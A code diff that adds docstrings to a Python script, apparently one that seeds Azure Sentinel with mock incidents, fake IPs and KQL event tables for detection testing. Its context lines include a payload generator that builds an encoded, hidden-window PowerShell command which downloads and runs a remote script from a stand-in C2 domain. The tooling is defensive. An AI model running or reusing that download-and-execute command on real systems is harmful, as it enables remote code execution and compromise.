@@ -18,6 +18,17 @@ CAMPAIGN_SHARED_IOCS = {
 }
 
 def generate_obfuscated_payload(ip: str, domain: str, profile: list[int]) -> str:
+    """
+    Generates an obfuscated mock payload string based on a selection profile.
+
+    Args:
+        ip: The attacker IP address.
+        domain: The Command & Control (C2) domain.
+        profile: A list of integers specifying which payload techniques to use.
+
+    Returns:
+        The generated mock payload string.
+    """
     def p1():
         cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{domain}/malware.ps1')"
         return f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {base64.b64encode(cmd.encode()).decode()}"
@@ -79,6 +90,15 @@ HOSTNAMES = [
 ]
 
 def generate_random_ip(is_internal=False):
+    """
+    Generates a random IPv4 address.
+
+    Args:
+        is_internal: If True, generates an RFC 1918 10.x.x.x address. Otherwise public.
+
+    Returns:
+        A randomly generated IP string.
+    """
     if is_internal:
         return f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
     return f"{random.randint(11, 200)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -315,6 +335,15 @@ SCENARIOS = [
 ]
 
 def generate_scenario_datatable(scenario: dict) -> str:
+    """
+    Generates a Kusto Query Language (KQL) datatable for the given mock scenario.
+
+    Args:
+        scenario: Dictionary containing the scenario configuration.
+
+    Returns:
+        A KQL string containing the mock event data.
+    """
     rows = []
     
     if scenario["special"] == "zero_entity":
@@ -370,6 +399,17 @@ def generate_scenario_datatable(scenario: dict) -> str:
     return kql
 
 def build_rule_body(scenario: dict, rule_id: str, kql_query: str) -> dict:
+    """
+    Constructs the Azure ARM REST API body for a Scheduled Analytics Rule.
+
+    Args:
+        scenario: Dictionary containing the scenario configuration.
+        rule_id: The UUID representing the new alert rule.
+        kql_query: The generated KQL datatable query.
+
+    Returns:
+        A dictionary representing the JSON payload for the Azure Sentinel API.
+    """
     entity_mappings = []
     
     if "IP" in scenario["entity_mappings"]:
@@ -446,6 +486,12 @@ def build_rule_body(scenario: dict, rule_id: str, kql_query: str) -> dict:
 
 
 def create_mock_incidents():
+    """
+    Creates mock Sentinel incidents by provisioning scheduled analytics rules.
+
+    Returns:
+        None
+    """
     load_dotenv()
     headers = get_auth_headers()
     
